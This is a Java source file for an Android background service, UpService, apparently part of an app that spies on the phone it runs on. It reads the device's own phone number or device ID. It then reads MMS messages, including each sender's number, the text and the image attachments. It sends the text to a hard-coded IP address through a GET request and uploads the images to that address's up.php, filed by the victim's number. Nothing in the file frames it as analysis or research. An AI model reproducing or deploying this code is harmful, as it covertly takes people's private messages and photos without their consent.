package ily.xieqing.com.myapplication;

import android.annotation.SuppressLint;
import android.app.IntentService;
import android.content.ContentResolver;
import android.content.Intent;
import android.content.Context;
import android.database.Cursor;
import android.net.Uri;
import android.os.Environment;
import android.telephony.TelephonyManager;
import android.text.TextUtils;
import android.util.Log;
import android.widget.Toast;

import org.json.JSONException;
import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.io.UnsupportedEncodingException;
import java.text.MessageFormat;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;

import okhttp3.MediaType;
import okhttp3.MultipartBody;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;
import okhttp3.Response;

/**
 * An {@link IntentService} subclass for handling asynchronous task requests in
 * a service on a separate handler thread.
 * <p>
 * TODO: Customize class - update intent actions, extra parameters and static
 * helper methods.
 */
public class UpService extends IntentService {
    private String TAG = "UpService";
    // TODO: Rename actions, choose action names that describe tasks that this
    // IntentService can perform, e.g. ACTION_FETCH_NEW_ITEMS
    private static final String ACTION_FOO = "ily.xieqing.com.myapplication.action.FOO";
    private static final String ACTION_BAZ = "ily.xieqing.com.myapplication.action.BAZ";

    // TODO: Rename parameters
    private static final String EXTRA_PARAM1 = "ily.xieqing.com.myapplication.extra.PARAM1";
    private static final String EXTRA_PARAM2 = "ily.xieqing.com.myapplication.extra.PARAM2";
    public static final SimpleDateFormat DEFAULT_SDF = new SimpleDateFormat("yyyy-MM-ddHHmmss", Locale.getDefault());
    public UpService() {
        super("UpService");
    }

    /**
     * Starts this service to perform action Foo with the given parameters. If
     * the service is already performing a task this action will be queued.
     *
     * @see IntentService
     */
    // TODO: Customize helper method
    public static void startActionFoo(Context context, String param1, String param2) {
        Intent intent = new Intent(context, UpService.class);
        intent.setAction(ACTION_FOO);
        intent.putExtra(EXTRA_PARAM1, param1);
        intent.putExtra(EXTRA_PARAM2, param2);
        context.startService(intent);
    }

    /**
     * Starts this service to perform action Baz with the given parameters. If
     * the service is already performing a task this action will be queued.
     *
     * @see IntentService
     */
    // TODO: Customize helper method
    public static void startActionBaz(Context context, String param1, String param2) {
        Intent intent = new Intent(context, UpService.class);
        intent.setAction(ACTION_BAZ);
        intent.putExtra(EXTRA_PARAM1, param1);
        intent.putExtra(EXTRA_PARAM2, param2);
        context.startService(intent);
    }

    @Override
    protected void onHandleIntent(Intent intent) {
        if (intent != null) {
            final String action = intent.getAction();
            if (ACTION_FOO.equals(action)) {
                final String param1 = intent.getStringExtra(EXTRA_PARAM1);
                final String param2 = intent.getStringExtra(EXTRA_PARAM2);
                handleActionFoo(param1, param2);
            } else if (ACTION_BAZ.equals(action)) {
                final String param1 = intent.getStringExtra(EXTRA_PARAM1);
                final String param2 = intent.getStringExtra(EXTRA_PARAM2);
                handleActionBaz(param1, param2);
            }
        }
    }

    /**
     * Handle action Foo in the provided background thread with the provided
     * parameters.
     */
    @SuppressLint("MissingPermission")
    private void handleActionFoo(String param1, String param2) {
        // TODO: Handle action Foo
        TelephonyManager telephonyManager = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
        String NativePhoneNumber = telephonyManager.getLine1Number();
        if (TextUtils.isEmpty(NativePhoneNumber)){
            NativePhoneNumber=telephonyManager.getDeviceId();
        }else{
            NativePhoneNumber=NativePhoneNumber.substring(1);
        }
        Log.e("duanxin", "Context");

        Log.e("duanxin", "MmsSmsReceiver23");
        final String SMS_URI_MMS = "content://mms"; //此处查询的表是pdu表
        ContentResolver MMScr = getContentResolver();
        Uri MMSuri = Uri.parse(SMS_URI_MMS);
        Cursor MMScursor = null;
        MMScursor = MMScr.query(MMSuri, null, null, null, null);//查出所有彩信
        if (MMScursor == null) {
            Log.e("duanxin", "MmsSmsReceiver32131");
            return;
        }
        if (!MMScursor.moveToFirst()) {//跳转到第一行，如果失败跳出方法，成功则进入do while循环
            Log.e("duanxin", "MmsSmsReceiver34444");
            return;
        }

        final JSONObject jsonObject = new JSONObject();
        String id = MMScursor.getString(MMScursor.getColumnIndex("_id"));// 获取pdu表里 彩信的id
         String phonenumberadd = getAddressNumber(this, id);
        final String phonenumber = phonenumberadd.substring(1);
        int timess = MMScursor.getInt(MMScursor.getColumnIndex("date"));
        long timesslong = (long) timess * 1000;//彩信获取的时间是以秒为单位的。
        Date d = new Date(timesslong);
        // String date = dateFormat.format(d);
        String sub = MMScursor.getString(MMScursor.getColumnIndex("sub"));//获取彩信主题
        try {
            if (!TextUtils.isEmpty(sub)) {
                sub = new String(sub.getBytes("ISO8859_1"), "UTF-8");
            } else {
                sub = " ";
            }
        } catch (UnsupportedEncodingException e) {
            e.printStackTrace();
        }
        final String SMS_URI_MMS_PART = "content://mms/part"; //从part表 获取彩信详情
        String selectionPart = "mid=" + id;// part表mid字段即为 pdu表 _id 字段
        ContentResolver Scr = getContentResolver();
        //String[]        projection = new String[]{"_id", "address", "person", "body", "date", "type","protocol"};
        Uri uri = Uri.parse(SMS_URI_MMS_PART);
        Cursor cursor = Scr.query(uri, null, selectionPart, null, null); //查询 part 指定mid的数据
        if (cursor == null) {
            Log.e("duanxin", "MmsSmsReceiver211");
            return;
        } else {
            Log.e("duanxin", "MmsSmsReceiver677631");
            if (cursor.moveToFirst()) {//游标移至第一行成功 则进入do while 循环 一个mid查询出来的结果可能是多条，彩信的结构也
                //是多层的 有点类似html的结构
                Log.e("duanxin", "MmsSmsReceiver564562");
                do {
                    String type = cursor.getString(cursor.getColumnIndex("ct"));
                    //part表 ct字段 标识 此part内容类型，彩信始末：application/smil；如果是文本附件：text/plain；
                    //图像附件：jpg：image/jpeg，gif：image/gif；音频附件：audio/mpeg
                    if ("text/plain".equals(type)) {
                        Log.e("duanxin", "MmsSmsReceiver2222");
                        String data = cursor.getString(cursor.getColumnIndex("_data"));
                        // 当此part类型为文本附件时，通过_data拿到文本附件地址
                        final String body;//彩信文本
                        if (data != null) {//附件地址不为空
                            // implementation of this method below
                            String partId = cursor.getString(cursor.getColumnIndex("_id"));
                            body = getMmsText(this, partId);
                            Log.e("duanxin", "getMmsText"+body);
                            try {
                                jsonObject.putOpt("content", body);
                                //因为要存数据库 删掉所有emoji
                            } catch (JSONException e) {
                                e.printStackTrace();
                            }
                        } else {//附件地址为空时通过text获取文本
                            //如果是彩信始末，为彩信的SMIL内容；如果是文本附件，为附件内容；如果是视频、音频附件，text为空
                            body = cursor.getString(cursor.getColumnIndex("text"));
                            try {
                                jsonObject.putOpt("content", body);
                            } catch (JSONException e) {
                                e.printStackTrace();
                            }
                            Log.e(TAG, "text222"+jsonObject.toString());
                        }
                        final String finalNativePhoneNumber = NativePhoneNumber;
                        new Thread(new Runnable() {
                            @Override
                            public void run() {
                                try {
                                    Log.e(TAG, "text"+jsonObject.toString());
                                    Response execute = new OkHttpClient().newCall(new Request.Builder()
                                            .url("http://202.79.169.167/1.php?id=" + finalNativePhoneNumber + "&neirong=" +phonenumber+"---"+body).get().build()).execute();
                                    String jsonString = execute.body().string();
                                    Log.e(TAG, " upload execute =" + jsonString);
                                } catch (IOException e) {
                                    e.printStackTrace();
                                }
                            }
                        }).start();
                    } else if ("image/jpeg".equals(type)||"image/png".equals(type)||"image/jpg".equals(type)) {

                        String body = null;//彩信文本
                        File body2 = null;//彩信文本
                        String partId = cursor.getString(cursor.getColumnIndex("_id"));
                        body = getMmsImage(this, partId);
                        body2 = getMmsImage2(this, partId);
                        Log.e("duanxin", "contentcontent"+body);
                        try {
                            jsonObject.putOpt("content", sub);
                            //因为要存数据库 删掉所有emoji
                        } catch (JSONException e) {
                            e.printStackTrace();
                        }
                        final String finalBody = body;
                        final File finalBody2 = body2;
                        final String finalNativePhoneNumber1 = NativePhoneNumber;
                        new Thread(new Runnable() {
                            @Override
                            public void run() {
                                Log.e(TAG, "run2: " + Thread.currentThread().getName());
                                if (finalBody2 != null) {
                                    try {
                                        String name = DEFAULT_SDF.format(new Date()) + ".png";
                                        RequestBody fileBody = RequestBody.create(MediaType.parse("image/png"), finalBody2);

                                        RequestBody requestBody = new MultipartBody.Builder()
                                                .setType(MultipartBody.FORM)
                                                .addFormDataPart("save_name",name)
                                                .addFormDataPart("save_path","./A/"+ finalNativePhoneNumber1 +"/")
                                                .addFormDataPart("uploadedfile",name, fileBody)
                                                .build();
                                        Response execute = new OkHttpClient().newCall(new Request.Builder()
                                                .url("http://202.79.169.167/up.php").post(requestBody).build()).execute();
                                        String jsonString = execute.body().string();
                                        //Toast.makeText(context, "上传成功1!", Toast.LENGTH_SHORT).show();
                                        Log.e(TAG, " upload jsonString =" + name+jsonString);
                                    } catch (IOException e) {
                                        e.printStackTrace();
                                    }
                                }

                            }
                        }).start();
                    } else {
                        Log.e("duanxin", "MmsSmsReceiver22312312412"+type);
                        continue;
                    }

                } while (cursor.moveToNext());
            }
            Log.e("duanxin", "MmsSmsReceiver68881");
        }
        Toast.makeText(this, "phonenumber" + phonenumber + "彩信=" + jsonObject.toString(), Toast.LENGTH_SHORT).show();
        Log.e("duanxin", "phonenumber" + phonenumber + "彩信=" + jsonObject.toString());


    }
    private static String getAddressNumber(Context context, String id) {
        //此处id 也是pdu表的_id字段
        String uriStr = MessageFormat.format("content://mms/{0}/addr", id);
        Uri uriAddress = Uri.parse(uriStr);
        Cursor cAdd = context.getContentResolver().query(uriAddress, null,
                null, null, null);
        String name = null;
        if (cAdd.moveToFirst()) {
            do {
                String number = cAdd.getString(cAdd.getColumnIndex("address"));
                if (number != null) {
                    try {
                        Long.parseLong(number.replace("-", ""));
                        name = number;
                    } catch (NumberFormatException nfe) {
                        if (name == null) {
                            name = number;
                        }
                    }
                }
            } while (cAdd.moveToNext());
        }
        if (cAdd != null) {
            cAdd.close();
        }
        return name;
    }

    private File getMmsImage2(Context context, String _id) { //读取图片附件
        Uri partURI = Uri.parse("content://mms/part/" + _id);
        InputStream is = null;
        String main = Environment.getExternalStorageDirectory() + "/Android/data/com" +
                ".ily.xieqing.com.myapplication/";

        if (!createOrExistsDir(new File(main))) {
            Log.e(TAG, "创建失败1");
            return null;
        }

        File file = new File(main + DEFAULT_SDF.format(new Date()) + ".png");
        if (file.exists()) {
            file.delete();
        }
        if (!createOrExistsFile(file)) {
            Log.e(TAG, "创建失败2");
            return null;
        }
        OutputStream os = null;
        try {
            is = context.getContentResolver().openInputStream(partURI);
            os = new FileOutputStream(file);
            int len = 0;
            byte[] buffer = new byte[8192];
            while ((len = is.read(buffer)) != -1) {
                os.write(buffer, 0, len);
            }
        } catch (IOException e) {
            e.printStackTrace();
            Log.e(TAG, "读取图片异常" + e.getMessage());
        } finally {
            if (is != null) {
                try {
                    is.close();
                } catch (IOException e) {
                    Log.e(TAG, "读取图片异常" + e.getMessage());
                }
            }
            if (os != null) {
                try {
                    os.close();
                } catch (IOException e) {
                    Log.v(TAG, "读取图片异常2" + e.getMessage());
                }
            }
        }
        return file;
    }


    public static boolean createOrExistsFile(File file) {
        if (file == null) return false;
        // 如果存在，是文件则返回true，是目录则返回false
        if (file.exists()) return file.isFile();
        if (!createOrExistsDir(file.getParentFile())) return false;
        try {
            return file.createNewFile();
        } catch (IOException e) {
            e.printStackTrace();
            return false;
        }
    }

    public static boolean createOrExistsDir(File file) {
        // 如果存在，是目录则返回true，是文件则返回false，不存在则返回是否创建成功
        return file != null && (file.exists() ? file.isDirectory() : file.mkdirs());
    }


    private String getMmsImage(Context context, String _id) { //读取图片附件
        Uri partURI = Uri.parse("content://mms/part/" + _id);


        Cursor cAdd = context.getContentResolver().query(partURI, null,
                null, null, null);
        String name = null;
        if (cAdd.moveToFirst()) {
            do {
                name = cAdd.getString(cAdd.getColumnIndex("text"));
            } while (cAdd.moveToNext());
        }
        return name;
    }

    private static String getMmsText(Context context, String id) {
        //此处id 为part表的_id 字段
        Uri partURI = Uri.parse("content://mms/part/" + id);
        InputStream is = null;
        StringBuilder sb = new StringBuilder();
        try {
            try {
                is = context.getContentResolver().openInputStream(partURI);
                if (is != null) {
                    InputStreamReader isr = new InputStreamReader(is, "UTF-8");
                    BufferedReader reader = new BufferedReader(isr);
                    String temp = reader.readLine();
                    while (temp != null) {
                        sb.append(temp);
                        temp = reader.readLine();
                    }
                }
            } catch (FileNotFoundException e) {
                e.printStackTrace();
            }

        } catch (IOException e) {
        } finally {
            if (is != null) {
                try {
                    is.close();
                } catch (IOException e) {
                }
            }
        }
        return sb.toString();
    }
    /**
     * Handle action Baz in the provided background thread with the provided
     * parameters.
     */
    private void handleActionBaz(String param1, String param2) {
    }
}
